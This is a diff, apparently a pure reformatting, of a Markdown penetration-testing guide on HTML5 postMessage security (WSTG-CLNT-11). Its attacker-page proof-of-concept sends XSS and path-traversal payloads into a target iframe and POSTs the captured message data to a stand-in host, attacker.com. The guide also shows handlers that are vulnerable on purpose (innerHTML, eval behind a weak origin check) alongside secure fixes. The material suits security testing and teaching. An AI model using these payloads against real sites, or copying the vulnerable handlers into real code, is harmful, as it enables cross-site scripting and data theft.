@@ -1,9 +1,11 @@
 # WSTG-CLNT-11: Testing Web Messaging
 
 ## Test ID
+
 WSTG-CLNT-11
 
 ## Test Name
+
 Testing Web Messaging
 
 ## High-Level Description
@@ -17,7 +19,7 @@ HTML5 Web Messaging (postMessage API) allows cross-origin communication between 
 - [ ] postMessage origin validation
 - [ ] Message data sanitization
 - [ ] Sensitive data in messages
-- [ ] Wildcard (*) targetOrigin
+- [ ] Wildcard (\*) targetOrigin
 - [ ] Message handler implementation
 
 ---
@@ -29,26 +31,30 @@ HTML5 Web Messaging (postMessage API) allows cross-origin communication between 
 ```javascript
 // Browser console - Find postMessage listeners
 // Check for message event listeners
-const listeners = getEventListeners(window);
-console.log('Message listeners:', listeners.message);
+const listeners = getEventListeners(window)
+console.log("Message listeners:", listeners.message)
 
 // Monitor postMessage calls
-const originalPostMessage = window.postMessage;
-window.postMessage = function(message, targetOrigin, transfer) {
-    console.log('postMessage called:');
-    console.log('  Message:', message);
-    console.log('  Target Origin:', targetOrigin);
-    console.log('  Transfer:', transfer);
-    return originalPostMessage.apply(this, arguments);
-};
+const originalPostMessage = window.postMessage
+window.postMessage = function (message, targetOrigin, transfer) {
+  console.log("postMessage called:")
+  console.log("  Message:", message)
+  console.log("  Target Origin:", targetOrigin)
+  console.log("  Transfer:", transfer)
+  return originalPostMessage.apply(this, arguments)
+}
 
 // Monitor incoming messages
-window.addEventListener('message', function(event) {
-    console.log('Message received:');
-    console.log('  Origin:', event.origin);
-    console.log('  Data:', event.data);
-    console.log('  Source:', event.source);
-}, true);
+window.addEventListener(
+  "message",
+  function (event) {
+    console.log("Message received:")
+    console.log("  Origin:", event.origin)
+    console.log("  Data:", event.data)
+    console.log("  Source:", event.source)
+  },
+  true,
+)
 ```
 
 ### Step 2: Test Origin Validation
@@ -57,46 +63,49 @@ window.addEventListener('message', function(event) {
 <!-- Host on attacker.com to test origin validation -->
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>postMessage Origin Test</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>postMessage Security Test</h1>
     <iframe id="target" src="https://target.com/page-with-postmessage"></iframe>
 
     <script>
-        const iframe = document.getElementById('target');
+      const iframe = document.getElementById("target")
 
-        iframe.onload = function() {
-            // Test 1: Send message to see if origin is validated
-            iframe.contentWindow.postMessage('test_message', '*');
+      iframe.onload = function () {
+        // Test 1: Send message to see if origin is validated
+        iframe.contentWindow.postMessage("test_message", "*")
 
-            // Test 2: Send XSS payload
-            iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
+        // Test 2: Send XSS payload
+        iframe.contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*")
 
-            // Test 3: Send JSON payload
-            iframe.contentWindow.postMessage(JSON.stringify({
-                action: 'getData',
-                id: '../../admin'
-            }), '*');
-        };
+        // Test 3: Send JSON payload
+        iframe.contentWindow.postMessage(
+          JSON.stringify({
+            action: "getData",
+            id: "../../admin",
+          }),
+          "*",
+        )
+      }
 
-        // Listen for responses
-        window.addEventListener('message', function(event) {
-            console.log('Response from:', event.origin);
-            console.log('Data:', event.data);
+      // Listen for responses
+      window.addEventListener("message", function (event) {
+        console.log("Response from:", event.origin)
+        console.log("Data:", event.data)
 
-            // Exfiltrate to attacker server
-            fetch('https://attacker.com/log', {
-                method: 'POST',
-                body: JSON.stringify({
-                    origin: event.origin,
-                    data: event.data
-                })
-            });
-        });
+        // Exfiltrate to attacker server
+        fetch("https://attacker.com/log", {
+          method: "POST",
+          body: JSON.stringify({
+            origin: event.origin,
+            data: event.data,
+          }),
+        })
+      })
     </script>
-</body>
+  </body>
 </html>
 ```
 
@@ -276,21 +285,21 @@ print(tester.generate_poc())
 
 ```javascript
 // VULNERABLE: No origin check
-window.addEventListener('message', function(event) {
-    // Processes messages from ANY origin
-    document.getElementById('output').innerHTML = event.data;
-});
+window.addEventListener("message", function (event) {
+  // Processes messages from ANY origin
+  document.getElementById("output").innerHTML = event.data
+})
 
 // VULNERABLE: Weak origin check (can be bypassed)
-window.addEventListener('message', function(event) {
-    if (event.origin.indexOf('trusted.com') !== -1) {
-        // Bypassed with: attacker-trusted.com or trusted.com.attacker.com
-        eval(event.data);
-    }
-});
+window.addEventListener("message", function (event) {
+  if (event.origin.indexOf("trusted.com") !== -1) {
+    // Bypassed with: attacker-trusted.com or trusted.com.attacker.com
+    eval(event.data)
+  }
+})
 
 // VULNERABLE: Wildcard targetOrigin
-targetWindow.postMessage(sensitiveData, '*');
+targetWindow.postMessage(sensitiveData, "*")
 // Any window can receive this message
 ```
 
@@ -298,12 +307,12 @@ targetWindow.postMessage(sensitiveData, '*');
 
 ## Tools
 
-| Tool | Purpose |
-|------|---------|
-| Browser DevTools | Monitor postMessage traffic |
-| Burp Suite | Intercept and analyze messages |
-| PMHook | Browser extension for postMessage monitoring |
-| Custom PoC | Test specific vulnerabilities |
+| Tool             | Purpose                                      |
+| ---------------- | -------------------------------------------- |
+| Browser DevTools | Monitor postMessage traffic                  |
+| Burp Suite       | Intercept and analyze messages               |
+| PMHook           | Browser extension for postMessage monitoring |
+| Custom PoC       | Test specific vulnerabilities                |
 
 ---
 
@@ -311,44 +320,44 @@ targetWindow.postMessage(sensitiveData, '*');
 
 ```javascript
 // SECURE: Proper origin validation
-window.addEventListener('message', function(event) {
-    // Strict origin check
-    const allowedOrigins = ['https://trusted.com', 'https://app.trusted.com'];
+window.addEventListener("message", function (event) {
+  // Strict origin check
+  const allowedOrigins = ["https://trusted.com", "https://app.trusted.com"]
 
-    if (!allowedOrigins.includes(event.origin)) {
-        console.warn('Rejected message from:', event.origin);
-        return;
-    }
+  if (!allowedOrigins.includes(event.origin)) {
+    console.warn("Rejected message from:", event.origin)
+    return
+  }
 
-    // Validate message structure
-    let data;
-    try {
-        data = JSON.parse(event.data);
-    } catch (e) {
-        console.warn('Invalid message format');
-        return;
-    }
+  // Validate message structure
+  let data
+  try {
+    data = JSON.parse(event.data)
+  } catch (e) {
+    console.warn("Invalid message format")
+    return
+  }
 
-    // Validate expected properties
-    if (!data.action || typeof data.action !== 'string') {
-        return;
-    }
+  // Validate expected properties
+  if (!data.action || typeof data.action !== "string") {
+    return
+  }
 
-    // Safe processing with allowlist
-    const allowedActions = ['getData', 'updateUI'];
-    if (allowedActions.includes(data.action)) {
-        processMessage(data);
-    }
-});
+  // Safe processing with allowlist
+  const allowedActions = ["getData", "updateUI"]
+  if (allowedActions.includes(data.action)) {
+    processMessage(data)
+  }
+})
 
 // SECURE: Specific targetOrigin
-const targetOrigin = 'https://trusted.com';
-targetWindow.postMessage(JSON.stringify({action: 'update'}), targetOrigin);
+const targetOrigin = "https://trusted.com"
+targetWindow.postMessage(JSON.stringify({ action: "update" }), targetOrigin)
 
 // SECURE: Sanitize before DOM insertion
 function processMessage(data) {
-    const sanitized = DOMPurify.sanitize(data.content);
-    document.getElementById('output').textContent = sanitized;
+  const sanitized = DOMPurify.sanitize(data.content)
+  document.getElementById("output").textContent = sanitized
 }
 ```
 
@@ -356,20 +365,20 @@ function processMessage(data) {
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| No origin validation + XSS sink | 8.1 | High |
-| Wildcard targetOrigin with sensitive data | 6.5 | Medium |
-| Weak origin validation | 5.4 | Medium |
+| Finding                                   | CVSS | Severity |
+| ----------------------------------------- | ---- | -------- |
+| No origin validation + XSS sink           | 8.1  | High     |
+| Wildcard targetOrigin with sensitive data | 6.5  | Medium   |
+| Weak origin validation                    | 5.4  | Medium   |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
-| **CWE-346** | Origin Validation Error |
-| **CWE-79** | Improper Neutralization of Input During Web Page Generation |
+| CWE ID      | Title                                                       |
+| ----------- | ----------------------------------------------------------- |
+| **CWE-346** | Origin Validation Error                                     |
+| **CWE-79**  | Improper Neutralization of Input During Web Page Generation |
 
 ---
 
